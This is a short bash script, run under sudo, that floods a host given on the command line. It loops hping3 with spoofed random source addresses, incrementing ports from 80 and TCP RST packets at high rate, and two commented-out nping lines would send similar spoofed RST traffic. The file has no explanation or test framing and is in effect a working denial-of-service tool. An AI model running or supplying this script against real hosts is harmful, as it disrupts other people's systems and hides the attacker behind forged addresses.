#!/usr/bin/sudo /bin/bash
target=$1
loops=$2


while [ $loops -gt 0 ]
do
#    nping -c 100 --rate 10000 --tcp --flags RST -S random -p 80 "$target" &
    hping3 --rand-source -c 10000 --faster -p ++80 -L 0 -M 0 -b -R "$target"
    loops=$(( $loops - 1 ))
done

#nping -c 10 --rate 10000 --tcp --flags RST -S random -p 80 "$target"
